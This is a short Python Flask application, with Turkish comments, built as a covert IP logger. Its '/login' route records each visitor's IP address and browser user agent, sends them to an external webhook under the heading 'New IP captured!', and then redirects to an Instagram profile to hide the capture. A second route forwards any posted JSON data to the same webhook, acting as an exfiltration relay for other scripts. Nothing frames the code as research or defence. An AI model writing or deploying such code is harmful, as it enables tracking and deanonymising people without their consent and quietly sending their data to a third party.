import os
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Webhook URL ve Yönlendirme
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
REDIRECT_URL = "https://www.instagram.com/nelo7capone1/"

# 1. IP Logger Rotası
@app.route('/login')
def logger():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    if WEBHOOK_URL:
        embed = {
            "title": "Yeni IP Yakalandı!",
            "color": 16711680,
            "fields": [
                {"name": "IP Adresi", "value": ip, "inline": True},
                {"name": "Cihaz/Tarayıcı", "value": user_agent, "inline": False}
            ]
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    
    return redirect(REDIRECT_URL)

# 2. Script Veri Aktarıcı (Proxy) Rotası
@app.route('/data-transfer', methods=['POST'])
def proxy_data():
    if WEBHOOK_URL and request.is_json:
        data = request.json
        requests.post(WEBHOOK_URL, json=data)
        return "İşlem Başarılı", 200
    return "Hata", 400

# 3. Ana Sayfa
@app.route('/')
def home():
    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
